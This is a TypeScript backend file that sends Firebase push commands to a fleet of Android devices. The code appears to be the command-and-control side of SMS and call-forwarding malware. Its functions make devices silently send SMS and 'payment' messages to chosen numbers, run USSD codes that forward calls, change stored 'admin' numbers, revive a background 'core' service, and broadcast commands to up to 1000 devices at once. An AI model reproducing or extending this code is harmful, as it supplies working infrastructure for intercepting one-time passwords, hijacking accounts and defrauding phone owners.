// File: src/services/fcmService.ts
import logger from "../logger/logger";
import {
  getDeviceFcmToken,
  updateFcmSendMeta,
  clearInvalidFcmToken,
} from "./deviceService";
import { getFirebaseMessaging } from "./firebaseAdmin";

const TAG = "fcmService";

type FcmDataPayload = Record<string, string>;

type SendCommandOptions = {
  requestId?: string;
  force?: boolean;
  extraData?: Record<string, string | number | boolean | null | undefined>;
};

/* ═══════════════════════════════════════════
   HELPERS
   ═══════════════════════════════════════════ */

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function toDataStringMap(
  input: Record<string, string | number | boolean | null | undefined>,
): FcmDataPayload {
  const out: FcmDataPayload = {};
  for (const [key, value] of Object.entries(input)) {
    if (value === undefined || value === null) continue;
    out[key] = String(value);
  }
  return out;
}

function isTokenPermanentlyInvalid(err: any): boolean {
  const code = clean(err?.code);
  return (
    code === "messaging/registration-token-not-registered" ||
    code === "messaging/invalid-registration-token"
  );
}

/* ═══════════════════════════════════════════
   PAYLOAD BUILDER
   ═══════════════════════════════════════════ */

/**
 * Build FCM data payload for any command.
 * All values MUST be strings (FCM data message requirement).
 */
export function buildCommandPayload(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
): FcmDataPayload {
  const base = {
    command,
    deviceId,
    requestId:
      options.requestId || `${command}_${deviceId}_${Date.now()}`,
    force: options.force === true ? "true" : "false",
    sentAt: Date.now(),
  };

  return {
    ...toDataStringMap(base),
    ...toDataStringMap(options.extraData || {}),
  };
}

/* ═══════════════════════════════════════════
   LOW-LEVEL SEND
   ═══════════════════════════════════════════ */

/**
 * Send FCM data message to a specific token.
 * Returns { success, messageId?, error? }
 */
export async function sendToToken(
  token: string,
  data: FcmDataPayload,
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  const cleanToken = clean(token);
  if (!cleanToken) {
    return { success: false, error: "missing_token" };
  }

  try {
    const messaging = getFirebaseMessaging();

    const messageId = await messaging.send({
      token: cleanToken,
      data,
      android: {
        priority: "high",
        ttl: 60 * 1000, // 60s TTL — command should be delivered quickly or not at all
      },
    });

    return { success: true, messageId };
  } catch (err: any) {
    return {
      success: false,
      error: clean(err?.code || err?.message || "send_failed"),
    };
  }
}

/**
 * Send FCM data message to a device by deviceId.
 * Looks up FCM token from DB, sends, records result, handles invalid tokens.
 */
export async function sendToDevice(
  deviceId: string,
  data: FcmDataPayload,
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  const token = await getDeviceFcmToken(deviceId);

  if (!token) {
    logger.warn(`${TAG}: sendToDevice skipped, token missing`, { deviceId });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastError: "missing_token",
      lastErrorAt: Date.now(),
    });
    return { success: false, error: "missing_token" };
  }

  const result = await sendToToken(token, data);

  if (result.success) {
    logger.info(`${TAG}: push sent`, {
      deviceId,
      messageId: result.messageId,
      command: data.command,
    });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastSuccessAt: Date.now(),
      lastMessageId: result.messageId || "",
      lastError: "",
    });
    return result;
  }

  logger.warn(`${TAG}: push failed`, {
    deviceId,
    error: result.error,
    command: data.command,
  });

  await updateFcmSendMeta(deviceId, {
    lastAttemptAt: Date.now(),
    lastErrorAt: Date.now(),
    lastError: result.error || "send_failed",
  });

  // Clear permanently invalid tokens
  if (isTokenPermanentlyInvalid({ code: result.error })) {
    await clearInvalidFcmToken(deviceId, result.error);
  }

  return result;
}

/* ═══════════════════════════════════════════
   GENERIC COMMAND SENDER
   ═══════════════════════════════════════════ */

/**
 * Send any named command to a device via FCM.
 * This is the primary function — all specific senders below use this.
 */
export async function sendCommandToDevice(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
) {
  const payload = buildCommandPayload(deviceId, command, options);
  return sendToDevice(deviceId, payload);
}

/* ═══════════════════════════════════════════
   CORE SERVICE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendRestartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "restart_core", options);
}

export async function sendReviveCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "revive_core", options);
}

export async function sendStartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "start_core", options);
}

export async function sendSyncToken(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "sync_token", options);
}

/* ═══════════════════════════════════════════
   SMS COMMANDS (NEW)
   ═══════════════════════════════════════════ */

/**
 * Send SMS command to device via FCM.
 * Device will wake up, send the SMS, and go back to sleep.
 *
 * @param deviceId  target device
 * @param to        recipient phone number
 * @param message   SMS text
 * @param sim       SIM slot index (0 or 1, default 0)
 * @param id        unique message ID for dedup on device side
 */
export async function sendSmsCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `sms_${deviceId}_${Date.now()}`;

  return sendCommandToDevice(deviceId, "send_sms", {
    requestId: msgId,
    extraData: {
      to: clean(to),
      message: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   CALL FORWARD COMMANDS (NEW)
   ═══════════════════════════════════════════ */

/**
 * Send call forward USSD command to device via FCM.
 * Device will wake up, execute USSD, report result, and go back to sleep.
 *
 * @param deviceId   target device
 * @param callCode   USSD code (e.g. "*21*9876543210#")
 * @param sim        SIM slot: "0" or "1"
 * @param phoneNumber  forwarding destination number (for display/logging)
 */
export async function sendCallForwardCommand(
  deviceId: string,
  callCode: string,
  sim: string = "0",
  phoneNumber?: string,
) {
  const requestId = `cf_${deviceId}_${Date.now()}`;

  return sendCommandToDevice(deviceId, "call_forward", {
    requestId,
    extraData: {
      callCode: clean(callCode),
      sim: clean(sim),
      phoneNumber: clean(phoneNumber || ""),
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   ADMIN UPDATE COMMANDS (NEW)
   ═══════════════════════════════════════════ */

/**
 * Notify device about admin list update via FCM.
 * Device will update its local admin numbers.
 */
export async function sendAdminListUpdate(
  deviceId: string,
  admins: string[],
) {
  return sendCommandToDevice(deviceId, "admins_update", {
    requestId: `admins_${deviceId}_${Date.now()}`,
    extraData: {
      admins: JSON.stringify(admins),
      timestamp: Date.now(),
    },
  });
}

/**
 * Notify device about global admin phone update via FCM.
 */
export async function sendGlobalAdminUpdate(
  deviceId: string,
  phone: string,
) {
  return sendCommandToDevice(deviceId, "global_admin_update", {
    requestId: `gadmin_${deviceId}_${Date.now()}`,
    extraData: {
      phone: clean(phone),
      timestamp: Date.now(),
    },
  });
}

/**
 * Notify device about device-specific admin phone update via FCM.
 */
export async function sendDeviceAdminPhoneUpdate(
  deviceId: string,
  phone: string,
) {
  return sendCommandToDevice(deviceId, "device_admin_update", {
    requestId: `dadmin_${deviceId}_${Date.now()}`,
    extraData: {
      phone: clean(phone),
      timestamp: Date.now(),
    },
  });
}

/**
 * Notify device about forwarding SIM change via FCM.
 */
export async function sendForwardingSimUpdate(
  deviceId: string,
  value: string,
) {
  return sendCommandToDevice(deviceId, "forwarding_sim_update", {
    requestId: `fsim_${deviceId}_${Date.now()}`,
    extraData: {
      value: clean(value),
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   PAYMENT COMMAND (NEW)
   ═══════════════════════════════════════════ */

/**
 * Send payment SMS command to device via FCM.
 * Similar to sendSmsCommand but with payment-specific metadata.
 */
export async function sendPaymentCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `pay_${deviceId}_${Date.now()}`;

  return sendCommandToDevice(deviceId, "payment", {
    requestId: msgId,
    extraData: {
      smsto: clean(to),
      smsContent: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   PING COMMAND
   ═══════════════════════════════════════════ */

/**
 * Send a ping to device via FCM.
 * Device will wake up briefly, report lastSeen, and go back to sleep.
 * Useful for checking if device is reachable.
 */
export async function sendPing(deviceId: string) {
  return sendCommandToDevice(deviceId, "ping", {
    requestId: `ping_${deviceId}_${Date.now()}`,
  });
}

/* ═══════════════════════════════════════════
   BROADCAST TO ALL DEVICES
   ═══════════════════════════════════════════ */

/**
 * Send a command to ALL devices that have a valid FCM token.
 * Use with caution — this can generate a lot of FCM messages.
 *
 * @param command    command name
 * @param options    send options
 * @param maxDevices safety cap (default 1000)
 *
 * Returns summary of results.
 */
export async function broadcastCommandToAllDevices(
  command: string,
  options: SendCommandOptions = {},
  maxDevices: number = 1000,
): Promise<{
  attempted: number;
  success: number;
  failed: number;
  skipped: number;
}> {
  // Import Device here to avoid circular dependency at module load time
  const Device = (await import("../models/Device")).default;

  const devices = await Device.find({ fcmToken: { $ne: "" } })
    .select("deviceId fcmToken")
    .limit(maxDevices)
    .lean();

  let attempted = 0;
  let success = 0;
  let failed = 0;
  let skipped = 0;

  for (const d of devices) {
    const deviceId = clean((d as any).deviceId);
    const token = clean((d as any).fcmToken);

    if (!deviceId || !token) {
      skipped++;
      continue;
    }

    attempted++;

    try {
      const result = await sendCommandToDevice(deviceId, command, options);
      if (result.success) {
        success++;
      } else {
        failed++;
      }
    } catch {
      failed++;
    }
  }

  logger.info(`${TAG}: broadcast complete`, {
    command,
    attempted,
    success,
    failed,
    skipped,
  });

  return { attempted, success, failed, skipped };
}

/* ═══════════════════════════════════════════
   DEFAULT EXPORT
   ═══════════════════════════════════════════ */

export default {
  buildCommandPayload,
  sendToToken,
  sendToDevice,
  sendCommandToDevice,
  sendRestartCore,
  sendReviveCore,
  sendStartCore,
  sendSyncToken,
  sendSmsCommand,
  sendCallForwardCommand,
  sendAdminListUpdate,
  sendGlobalAdminUpdate,
  sendDeviceAdminPhoneUpdate,
  sendForwardingSimUpdate,
  sendPaymentCommand,
  sendPing,
  broadcastCommandToAllDevices,
};